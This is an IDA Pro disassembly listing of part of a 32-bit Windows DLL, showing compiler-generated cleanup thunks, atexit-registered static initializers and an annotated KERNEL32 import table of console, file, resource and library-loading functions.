		jmp	Ordinal1061
sub_6AF53491	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53499	proc near		; DATA XREF: .rdata:6AF63BD8o
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF53499	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF534A1	proc near		; DATA XREF: .rdata:6AF63BF0o
		lea	ecx, [ebp-0A0h]
		jmp	Ordinal915
sub_6AF534A1	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF534AC	proc near		; DATA XREF: .rdata:6AF63BF8o
		lea	ecx, [ebp-0E0h]
		jmp	Ordinal303
sub_6AF534AC	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF534B7	proc near		; DATA XREF: .rdata:6AF63C00o
		lea	ecx, [ebp-2Ch]
		jmp	sub_6AF3789B
sub_6AF534B7	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF534BF	proc near		; DATA XREF: .rdata:6AF63C18o
		lea	ecx, [ebp-6Ch]
		jmp	Ordinal450
sub_6AF534BF	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_103. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF534D1	proc near		; DATA XREF: .rdata:6AF63CE8o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF534D1	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_104. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF534E3	proc near		; DATA XREF: .rdata:6AF63D50o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF534E3	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_105. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF534F5	proc near		; DATA XREF: .rdata:6AF63DB8o
		lea	ecx, [ebp-88h]
		jmp	Ordinal752
sub_6AF534F5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53500	proc near		; DATA XREF: .rdata:6AF63DC8o
		lea	ecx, [ebp+8]
		jmp	sub_6AF3789B
sub_6AF53500	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53508	proc near		; DATA XREF: .rdata:6AF63DD0o
		lea	ecx, [ebp+8]
		jmp	sub_6AF3789B
sub_6AF53508	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_106. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5351A	proc near		; DATA XREF: .rdata:6AF63E30o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF5351A	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53522	proc near		; DATA XREF: .rdata:6AF63E38o
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF53522	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_107. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53534	proc near		; DATA XREF: .rdata:6AF63EA0o
		lea	ecx, [ebp-90h]
		jmp	Ordinal1164
sub_6AF53534	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5353F	proc near		; DATA XREF: .rdata:6AF63EA8o
		lea	ecx, [ebp-44h]
		jmp	Ordinal752
sub_6AF5353F	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_108. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53551	proc near		; DATA XREF: .rdata:6AF63F10o
		lea	ecx, [ebp-30h]
		jmp	sub_6AF3789B
sub_6AF53551	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53559	proc near		; DATA XREF: .rdata:6AF63F18o
		lea	ecx, [ebp-64h]
		jmp	Ordinal752
sub_6AF53559	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53561	proc near		; DATA XREF: .rdata:6AF63F28o
		lea	ecx, [ebp-2Ch]
		jmp	sub_6AF3789B
sub_6AF53561	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53569	proc near		; DATA XREF: .rdata:6AF63F30o
		lea	ecx, [ebp+14h]
		jmp	sub_6AF3789B
sub_6AF53569	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53571	proc near		; DATA XREF: .rdata:6AF63F38o
		lea	ecx, [ebp+18h]
		jmp	sub_6AF3789B
sub_6AF53571	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_109. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53583	proc near		; DATA XREF: .rdata:stru_6AF63F94o
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF53583	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_110. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53596	proc near		; DATA XREF: .rdata:6AF63FBCo
		lea	ecx, [ebp-120h]
		jmp	Ordinal1330
sub_6AF53596	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_111. PRESS KEYPAD	"+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_112. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF535B5	proc near		; DATA XREF: .rdata:6AF640CCo
		lea	ecx, [ebp-170h]
		jmp	Ordinal752
sub_6AF535B5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF535C0	proc near		; DATA XREF: .rdata:6AF640E4o
		lea	ecx, [ebp-190h]
		jmp	Ordinal752
sub_6AF535C0	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF535CB	proc near		; DATA XREF: .rdata:6AF640F4o
		lea	ecx, [ebp-130h]
		jmp	Ordinal1330
sub_6AF535CB	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_113. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF535E0	proc near		; DATA XREF: .rdata:6AF64188o
		lea	ecx, [ebp-130h]
		jmp	Ordinal1330
sub_6AF535E0	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF535EB	proc near		; DATA XREF: .rdata:6AF64190o
		lea	ecx, [ebp-388h]
		jmp	Ordinal752
sub_6AF535EB	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_114. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53600	proc near		; DATA XREF: .rdata:6AF641F8o
		lea	ecx, [ebp-138h]
		jmp	Ordinal1334
sub_6AF53600	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_115. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53615	proc near		; DATA XREF: .rdata:6AF64284o
		lea	ecx, [ebp-18Ch]
		jmp	Ordinal752
sub_6AF53615	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53620	proc near		; DATA XREF: .rdata:6AF6429Co
		lea	ecx, [ebp-1ACh]
		jmp	Ordinal752
sub_6AF53620	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5362B	proc near		; DATA XREF: .rdata:6AF642ACo
		lea	ecx, [ebp-148h]
		jmp	Ordinal1334
sub_6AF5362B	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_116. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53640	proc near		; DATA XREF: .rdata:6AF64340o
		lea	ecx, [ebp-29Ch]
		jmp	Ordinal752
sub_6AF53640	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5364B	proc near		; DATA XREF: .rdata:6AF64350o
		lea	ecx, [ebp-270h]
		jmp	Ordinal1334
sub_6AF5364B	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_117. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53660	proc near		; DATA XREF: .rdata:stru_6AF643ACo
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF53660	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_118. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53673	proc near		; DATA XREF: .rdata:6AF643D4o
		lea	ecx, [ebp-60h]
		jmp	Ordinal1230
sub_6AF53673	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5367B	proc near		; DATA XREF: .rdata:6AF643DCo
		lea	ecx, [ebp-54h]
		jmp	Ordinal752
sub_6AF5367B	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_119. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5368D	proc near		; DATA XREF: .rdata:6AF64444o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF5368D	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_120. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5369F	proc near		; DATA XREF: .rdata:stru_6AF644A8o
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF5369F	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_121. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF536B2	proc near		; DATA XREF: .rdata:6AF644D0o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF536B2	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_122. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF536C4	proc near		; DATA XREF: .rdata:6AF64538o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF536C4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF536CC	proc near		; DATA XREF: .rdata:6AF64548o
		lea	ecx, [ebp-2Ch]
		jmp	sub_6AF3789B
sub_6AF536CC	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_123. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF536DE	proc near		; DATA XREF: .data:6AF68014o
		mov	ecx, offset dword_6AF681F8
		call	Ordinal636
		push	offset sub_6AF5374D ; void (__cdecl *)()
		call	_atexit
		pop	ecx
		retn
sub_6AF536DE	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF536F4	proc near		; DATA XREF: .data:6AF68008o
		mov	ecx, offset dword_6AF68284
		call	sub_6AF524A4
		push	offset sub_6AF53757 ; void (__cdecl *)()
		call	_atexit
		pop	ecx
		retn
sub_6AF536F4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5370A	proc near		; DATA XREF: .data:6AF6800Co
		call	ds:GetProcessHeap
		push	offset sub_6AF53761 ; void (__cdecl *)()
		mov	dword_6AF682C0,	offset off_6AF61A10
		mov	dword_6AF682C4,	eax
		mov	byte_6AF682C8, 0
		call	_atexit
		pop	ecx
		retn
sub_6AF5370A	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53732	proc near		; DATA XREF: .data:6AF68010o
		push	offset dword_6AF682C0
		mov	ecx, offset dword_6AF682CC
		call	sub_6AF525E6
		push	offset sub_6AF5376B ; void (__cdecl *)()
		call	_atexit
		pop	ecx
		retn
sub_6AF53732	endp


; =============== S U B	R O U T	I N E =======================================


; void __cdecl sub_6AF5374D()
sub_6AF5374D	proc near		; DATA XREF: sub_6AF536DE+Ao
		mov	ecx, offset dword_6AF681F8
		jmp	Ordinal638
sub_6AF5374D	endp


; =============== S U B	R O U T	I N E =======================================


; void __cdecl sub_6AF53757()
sub_6AF53757	proc near		; DATA XREF: sub_6AF536F4+Ao

; FUNCTION CHUNK AT 6AF523CB SIZE 0000001D BYTES
; FUNCTION CHUNK AT 6AF52440 SIZE 00000016 BYTES

		mov	ecx, offset dword_6AF68284
		jmp	loc_6AF52440
sub_6AF53757	endp


; =============== S U B	R O U T	I N E =======================================


; void __cdecl sub_6AF53761()
sub_6AF53761	proc near		; DATA XREF: sub_6AF5370A+6o
		mov	ecx, offset dword_6AF682C0
		jmp	sub_6AF5254F
sub_6AF53761	endp


; =============== S U B	R O U T	I N E =======================================


; void __cdecl sub_6AF5376B()
sub_6AF5376B	proc near		; DATA XREF: sub_6AF53732+Fo
		mov	dword_6AF682CC,	offset off_6AF61A24
		retn
sub_6AF5376B	endp

; ---------------------------------------------------------------------------
		align 4
		dd 22h dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00024000)
; Virtual size			: 000136BE (  79550.)
; Section size in file		: 00013800 (  79872.)
; Offset to raw	data for section: 00022C00
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value)
		extrn InterlockedExchange:dword	; CODE XREF: sub_6AF310AD+4Ap
					; Ordinal1411+1Ap ...
; UINT __stdcall GetACP()
		extrn GetACP:dword	; CODE XREF: sub_6AF31048:loc_6AF31094p
					; DATA XREF: sub_6AF31048:loc_6AF31094r
; int __stdcall	GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
		extrn GetLocaleInfoA:dword ; CODE XREF:	sub_6AF31048+23p
					; DATA XREF: sub_6AF31048+23r
; LCID __stdcall GetThreadLocale()
		extrn GetThreadLocale:dword ; CODE XREF: sub_6AF31048+11p
					; DATA XREF: sub_6AF31048+11r
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA	lpVersionInformation)
		extrn GetVersionExA:dword ; CODE XREF: sub_6AF310AD+22p
					; Ordinal932+6Cp ...
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn MultiByteToWideChar:dword	; CODE XREF: sub_6AF376A5+12p
					; sub_6AF376BF+19p
					; DATA XREF: ...
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword	; CODE XREF: sub_6AF3158E+16p
					; sub_6AF315AB+1Cp ...
; void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)
		extrn RaiseException:dword ; CODE XREF:	sub_6AF5215E+77p
					; sub_6AF5215E+13Bp ...
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: Ordinal306:loc_6AF39215p
					; Ordinal306+EDp ...
; void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn InitializeCriticalSection:dword ;	CODE XREF: sub_6AF31139+12p
					; Ordinal674+24p ...
; void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn DeleteCriticalSection:dword ; CODE XREF: Ordinal638+13p
					; Ordinal1283+Dp ...
; int __stdcall	lstrlenW(LPCWSTR lpString)
		extrn lstrlenW:dword	; CODE XREF: Ordinal339+7p
					; DATA XREF: Ordinal339+7r
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; CODE XREF: Ordinal238+11p
					; Ordinal336+7p ...
; DWORD	__stdcall SizeofResource(HMODULE hModule, HRSRC	hResInfo)
		extrn SizeofResource:dword ; CODE XREF:	sub_6AF3145D+2Dp
					; DATA XREF: sub_6AF3145D+2Dr
; LPVOID __stdcall LockResource(HGLOBAL	hResData)
		extrn LockResource:dword ; CODE	XREF: sub_6AF3145D+17p
					; DATA XREF: sub_6AF3145D+17r
; HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC	hResInfo)
		extrn LoadResource:dword ; CODE	XREF: sub_6AF3145D+9p
					; DATA XREF: sub_6AF3145D+9r
; HRSRC	__stdcall FindResourceA(HMODULE	hModule, LPCSTR	lpName,	LPCSTR lpType)
		extrn FindResourceA:dword ; CODE XREF: sub_6AF314B9+12p
					; DATA XREF: sub_6AF314B9+12r
; HRSRC	__stdcall FindResourceExA(HMODULE hModule, LPCSTR lpType, LPCSTR lpName, WORD wLanguage)
		extrn FindResourceExA:dword ; CODE XREF: sub_6AF314E8+16p
					; DATA XREF: sub_6AF314E8+16r
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn FreeLibrary:dword	; CODE XREF: Ordinal244+130p
					; Ordinal230+16p ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	Ordinal244+81p
					; Ordinal244+8Bp ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: Ordinal244+61p
					; Ordinal896+Cp ...
; LPSTR	__stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2)
		extrn lstrcatA:dword	; CODE XREF: Ordinal244+54p
					; Ordinal1277+40p
					; DATA XREF: ...
; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
		extrn GetSystemDirectoryA:dword	; CODE XREF: Ordinal244+32p
					; Ordinal1185+Dp ...
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
		extrn GlobalFree:dword	; CODE XREF: Ordinal381+A3p
					; Ordinal381+D2p
					; DATA XREF: ...
; BOOL __stdcall GlobalUnlock(HGLOBAL hMem)
		extrn GlobalUnlock:dword ; CODE	XREF: Ordinal381+92p
					; Ordinal380+141p
					; DATA XREF: ...
; LPVOID __stdcall GlobalLock(HGLOBAL hMem)
		extrn GlobalLock:dword	; CODE XREF: Ordinal381+53p
					; Ordinal380+CEp
					; DATA XREF: ...
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes)
		extrn GlobalAlloc:dword	; CODE XREF: Ordinal381+3Fp
					; DATA XREF: Ordinal381+3Fr
; SIZE_T __stdcall GlobalSize(HGLOBAL hMem)
		extrn GlobalSize:dword	; CODE XREF: Ordinal380+F6p
					; DATA XREF: Ordinal380+F6r
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
		extrn GetLocalTime:dword ; CODE	XREF: Ordinal382+54p
					; Ordinal408+21p ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: Ordinal423+71p
					; Ordinal423+D9p ...
; BOOL __stdcall ReadFile(HANDLE hFile,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; CODE XREF: Ordinal424+7Bp
					; Ordinal424+C0p ...
; DWORD	__stdcall GetCurrentThreadId()
		extrn GetCurrentThreadId:dword ; CODE XREF: Ordinal444+2Dp
					; Ordinal445+15p ...
; LPSTR	__stdcall GetCommandLineA()
		extrn GetCommandLineA:dword ; CODE XREF: Ordinal451+57p
					; DATA XREF: Ordinal451+57r
; BOOL __stdcall SetConsoleTitleA(LPCSTR lpConsoleTitle)
		extrn SetConsoleTitleA:dword ; CODE XREF: Ordinal482+49p
					; DATA XREF: Ordinal482+49r
; LPSTR	__stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2)
		extrn lstrcpyA:dword	; CODE XREF: Ordinal482+42p
					; Ordinal544+94p ...
; DWORD	__stdcall GetConsoleTitleA(LPSTR lpConsoleTitle, DWORD nSize)
		extrn GetConsoleTitleA:dword ; CODE XREF: Ordinal483+28p
					; DATA XREF: Ordinal483+28r
; BOOL __stdcall GetNumberOfConsoleInputEvents(HANDLE hConsoleInput, LPDWORD lpNumberOfEvents)
		extrn GetNumberOfConsoleInputEvents:dword ; CODE XREF: Ordinal500+ADp
					; DATA XREF: Ordinal500+ADr
; BOOL __stdcall ReadConsoleInputA(HANDLE hConsoleInput, PINPUT_RECORD lpBuffer, DWORD nLength,	LPDWORD	lpNumberOfEventsRead)
		extrn ReadConsoleInputA:dword ;	CODE XREF: Ordinal500+3Ap
					; DATA XREF: Ordinal500+3Ar
; BOOL __stdcall FreeConsole()
		extrn FreeConsole:dword	; CODE XREF: Ordinal481+108p
					; Ordinal480+41p
					; DATA XREF: ...
; BOOL __stdcall SetStdHandle(DWORD nStdHandle,	HANDLE hHandle)
		extrn SetStdHandle:dword ; CODE	XREF: Ordinal481+96p
					; Ordinal481+A2p ...
; BOOL __stdcall SetConsoleMode(HANDLE hConsoleHandle, DWORD dwMode)
		extrn SetConsoleMode:dword ; CODE XREF:	Ordinal481+6Dp
					; Ordinal480+14Ep ...
; BOOL __stdcall SetConsoleCtrlHandler(PHANDLER_ROUTINE	HandlerRoutine,	BOOL Add)
		extrn SetConsoleCtrlHandler:dword ; CODE XREF: Ordinal481+49p
					; Ordinal480+17Fp
					; DATA XREF: ...
; BOOL __stdcall GetConsoleMode(HANDLE hConsoleHandle, LPDWORD lpMode)
		extrn GetConsoleMode:dword ; CODE XREF:	Ordinal480+13Ep
					; DATA XREF: Ordinal480+13Er
; BOOL __stdcall GetConsoleScreenBufferInfo(HANDLE hConsoleOutput, PCONSOLE_SCREEN_BUFFER_INFO lpConsoleScreenBufferInfo)
		extrn GetConsoleScreenBufferInfo:dword ; CODE XREF: Ordinal480+11Fp
					; Ordinal515+4Ep ...
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; CODE	XREF: Ordinal480+72p
					; Ordinal480+79p ...
; BOOL __stdcall AllocConsole()
		extrn AllocConsole:dword ; CODE	XREF: Ordinal480:loc_6AF3E542p
					; DATA XREF: Ordinal480:loc_6AF3E542r
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: Ordinal511+22p
					; Ordinal638+26p ...
; BOOL __stdcall FillConsoleOutputAttribute(HANDLE hConsoleOutput, WORD	wAttribute, DWORD nLength, COORD dwWriteCoord, LPDWORD lpNumberOfAttrsWritten)
		extrn FillConsoleOutputAttribute:dword ; CODE XREF: Ordinal515+92p
					; Ordinal516+7Dp ...
; BOOL __stdcall WriteConsoleOutputCharacterA(HANDLE hConsoleOutput, LPCSTR lpCharacter, DWORD nLength,	COORD dwWriteCoord, LPDWORD lpNumberOfCharsWritten)
		extrn WriteConsoleOutputCharacterA:dword ; CODE	XREF: Ordinal515+78p
					; DATA XREF: Ordinal515+78r
; BOOL __stdcall SetConsoleCursorPosition(HANDLE hConsoleOutput, COORD dwCursorPosition)
		extrn SetConsoleCursorPosition:dword ; CODE XREF: Ordinal516+8Dp
					; Ordinal521+46p
					; DATA XREF: ...
; BOOL __stdcall FillConsoleOutputCharacterA(HANDLE hConsoleOutput, CHAR cCharacter, DWORD nLength, COORD dwWriteCoord,	LPDWORD	lpNumberOfCharsWritten)
		extrn FillConsoleOutputCharacterA:dword	; CODE XREF: Ordinal516+63p
					; DATA XREF: Ordinal516+63r
; BOOL __stdcall SetConsoleScreenBufferSize(HANDLE hConsoleOutput, COORD dwSize)
		extrn SetConsoleScreenBufferSize:dword ; CODE XREF: Ordinal523+6Bp
					; Ordinal509+8Cp
					; DATA XREF: ...
; BOOL __stdcall SetConsoleTextAttribute(HANDLE	hConsoleOutput,	WORD wAttributes)
		extrn SetConsoleTextAttribute:dword ; CODE XREF: Ordinal524+34p
					; Ordinal509+A0p
					; DATA XREF: ...
; BOOL __stdcall SetConsoleCursorInfo(HANDLE hConsoleOutput, const CONSOLE_CURSOR_INFO *lpConsoleCursorInfo)
		extrn SetConsoleCursorInfo:dword ; CODE	XREF: Ordinal525+60p
					; DATA XREF: Ordinal525+60r
; BOOL __stdcall GetConsoleCursorInfo(HANDLE hConsoleOutput, PCONSOLE_CURSOR_INFO lpConsoleCursorInfo)
		extrn GetConsoleCursorInfo:dword ; CODE	XREF: Ordinal525+35p
					; Ordinal526+35p
					; DATA XREF: ...
; BOOL __stdcall SetConsoleWindowInfo(HANDLE hConsoleOutput, BOOL bAbsolute, const SMALL_RECT *lpConsoleWindow)
		extrn SetConsoleWindowInfo:dword ; CODE	XREF: Ordinal509+B3p
					; DATA XREF: Ordinal509+B3r
; HANDLE __stdcall CreateConsoleScreenBuffer(DWORD dwDesiredAccess, DWORD dwShareMode, const SECURITY_ATTRIBUTES *lpSecurityAttributes,	DWORD dwFlags, LPVOID lpScreenBufferData)
		extrn CreateConsoleScreenBuffer:dword ;	CODE XREF: Ordinal509+2Dp
					; DATA XREF: Ordinal509+2Dr
; BOOL __stdcall SetConsoleActiveScreenBuffer(HANDLE hConsoleOutput)
		extrn SetConsoleActiveScreenBuffer:dword ; CODE	XREF: Ordinal514+31p
					; DATA XREF: Ordinal514+31r
; BOOL __stdcall WriteConsoleA(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID	lpReserved)
		extrn WriteConsoleA:dword ; CODE XREF: Ordinal519+12Cp
					; DATA XREF: Ordinal519+12Cr
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn TerminateProcess:dword ; CODE XREF: Ordinal564+27Bp
					; DATA XREF: Ordinal564+27Br
; HANDLE __stdcall GetCurrentProcess()
		extrn GetCurrentProcess:dword ;	CODE XREF: Ordinal564+274p
					; Ordinal634+94p ...
; DWORD	__stdcall GetCurrentProcessId()
		extrn GetCurrentProcessId:dword	; CODE XREF: Ordinal634+8Dp
					; Ordinal640+B6p ...
; BOOL __stdcall GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
		extrn GetThreadContext:dword ; CODE XREF: sub_6AF422CC+ADp
					; DATA XREF: sub_6AF422CC+ADr
; HANDLE __stdcall GetCurrentThread()
		extrn GetCurrentThread:dword ; CODE XREF: sub_6AF422CC+A6p
					; Ordinal954+B7p ...
; void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn EnterCriticalSection:dword ; CODE	XREF: Ordinal675+1Ap
					; Ordinal1284+27p ...
; void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn LeaveCriticalSection:dword ; CODE	XREF: Ordinal676+Ap
					; Ordinal1288+18p ...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; CODE XREF:	Ordinal677+B2p
					; Ordinal775+1Fp ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
		extrn CreateFileA:dword	; CODE XREF: Ordinal677+A0p
					; Ordinal773+33p
					; DATA XREF: ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: Ordinal679+52p
					; Ordinal1166+4Ep
					; DATA XREF: ...
; void __stdcall OutputDebugStringA(LPCSTR lpOutputString)
		extrn OutputDebugStringA:dword ; CODE XREF: Ordinal647+10p
					; DATA XREF: Ordinal647+10r
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
		extrn LocalFree:dword	; CODE XREF: Ordinal698+11p
					; Ordinal704+Ep ...
; DWORD	__stdcall FormatMessageA(DWORD dwFlags,	LPCVOID	lpSource, DWORD	dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments)
		extrn FormatMessageA:dword ; CODE XREF:	Ordinal704+2Bp
					; sub_6AF47470+23p
					; DATA XREF: ...
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
		extrn SetUnhandledExceptionFilter:dword	; CODE XREF: Ordinal748+Cp
					; Ordinal747+Dp
					; DATA XREF: ...
; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
		extrn FlushFileBuffers:dword ; CODE XREF: Ordinal785+3p
					; DATA XREF: Ordinal785+3r
; DWORD	__stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
		extrn GetFileSize:dword	; CODE XREF: Ordinal787+1Ap
					; DATA XREF: Ordinal787+1Ar
; BOOL __stdcall SetEndOfFile(HANDLE hFile)
		extrn SetEndOfFile:dword ; CODE	XREF: Ordinal789+17p
					; DATA XREF: Ordinal789+17r
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword	; CODE XREF: Ordinal794+96p
					; DATA XREF: Ordinal794+96r
